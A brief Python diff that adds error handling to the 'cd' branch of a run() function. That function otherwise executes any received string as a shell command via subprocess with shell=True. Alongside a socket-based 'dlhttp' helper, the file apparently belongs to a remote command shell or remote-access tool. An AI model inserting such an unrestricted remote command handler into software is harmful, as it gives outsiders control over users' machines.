@@ -44,9 +44,12 @@ def dlhttp(sock, url):
 def run(s):
   global cwd 
   if s.startswith('cd'):
-    os.chdir(s[2:])
-    cwd = os.getcwd()
-    return ''
+    try:
+      os.chdir(s[2:])
+      cwd = os.getcwd()
+      return ''
+    except Exception as e:
+      return str(e) + ' ⚠️'
   p = sp.Popen(s, shell=True, stdout=sp.PIPE, stderr=sp.PIPE)
   out, err = p.communicate()
   out = out.decode('utf-8')
